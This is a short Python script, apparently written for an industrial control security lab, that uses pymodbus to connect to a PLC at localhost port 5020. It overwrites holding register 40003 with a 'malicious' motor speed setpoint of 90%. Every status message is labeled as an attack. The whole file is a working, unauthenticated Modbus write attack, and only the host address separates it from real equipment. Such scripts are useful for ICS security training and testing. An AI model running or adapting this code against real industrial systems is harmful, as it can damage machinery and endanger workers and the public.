from pymodbus.client import ModbusTcpClient


PLC_HOST = "127.0.0.1"
PLC_PORT = 5020

SPEED_SETPOINT_REGISTER = 40003
SPEED_SETPOINT_RAW = 900  # 90.0%, fixed-point scale x10


def run_attack() -> None:
    client = ModbusTcpClient(
        host=PLC_HOST,
        port=PLC_PORT,
        timeout=3,
    )

    try:
        if not client.connect():
            raise RuntimeError(
                f"Could not connect to PLC at {PLC_HOST}:{PLC_PORT}"
            )

        print("[ATTACK] Connected to PLC-01")
        print("[ATTACK] Target: SPEED_SETPOINT (40003)")
        print("[ATTACK] Writing malicious setpoint: 90.0%")

        result = client.write_register(
            address=SPEED_SETPOINT_REGISTER - 40001,
            value=SPEED_SETPOINT_RAW,
        )

        if result.isError():
            raise RuntimeError(f"Modbus write failed: {result}")

        print("[ATTACK] Modbus write successful")
        print("[ATTACK] SPEED_SETPOINT changed to 90.0%")

    finally:
        client.close()
        print("[ATTACK] Connection closed")


if __name__ == "__main__":
    run_attack()
